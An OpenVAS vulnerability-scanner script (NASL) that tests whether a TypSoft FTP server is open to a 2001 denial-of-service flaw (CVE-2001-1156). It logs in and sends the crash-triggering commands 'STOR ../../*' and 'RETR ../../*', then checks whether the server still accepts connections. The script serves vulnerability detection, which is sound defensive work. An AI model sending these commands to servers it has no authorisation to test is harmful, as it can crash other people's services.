# OpenVAS Vulnerability Test
# $Id: typsoft_ftp_DoS.nasl 13614 2019-02-12 16:20:46Z cfischer $
# Description: TypSoft FTP STOR/RETR DoS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID and CAN
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

# References:
# Date:  Mon, 08 Oct 2001 14:05:00 +0200
# From: "J. Wagner" <jan.wagner@de.tiscali.com>
# To: bugtraq@securityfocus.com
# CC: "typsoft" <typsoft@altern.org>
# Subject: [ASGUARD-LABS] TYPSoft FTP Server v0.95 STOR/RETR \
#  Denial of Service Vulnerability

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11097");
  script_version("$Revision: 13614 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-12 17:20:46 +0100 (Tue, 12 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(3409);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2001-1156");
  script_name("TypSoft FTP STOR/RETR DoS");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2002 Michel Arboi");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/typsoft/detected");

  script_tag(name:"solution", value:"Upgrade your software or use another FTP service.");

  script_tag(name:"summary", value:"The remote FTP server crashes when it is sent the command

  RETR ../../*

  or

  STOR ../../*");

  script_tag(name:"impact", value:"An attacker may use this flaw to make your server crash.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("ftp_func.inc");

cmd[0] = "STOR";
cmd[1] = "RETR";

port = get_ftp_port(default:21);
banner = get_ftp_banner(port:port);
if( ! banner || "TYPSoft FTP Server" >!< banner )
  exit(0);

soc = open_sock_tcp(port);
if(! soc) exit(0);

kb_creds = ftp_get_kb_creds();
login = kb_creds["login"];
pass = kb_creds["pass"];

if (!ftp_authenticate(socket:soc, user:login, pass:pass)) exit(0);

#if(!r)exit(0);
for (i=0; i<2;i++){
  send(socket:soc, data:string(cmd[i], " ../../*\r\n"));
  r = recv_line(socket:soc, length:20000);
}

ftp_close(socket: soc);

soc = open_sock_tcp(port);
if (!soc) security_message(port);
if (soc) ftp_close(socket: soc);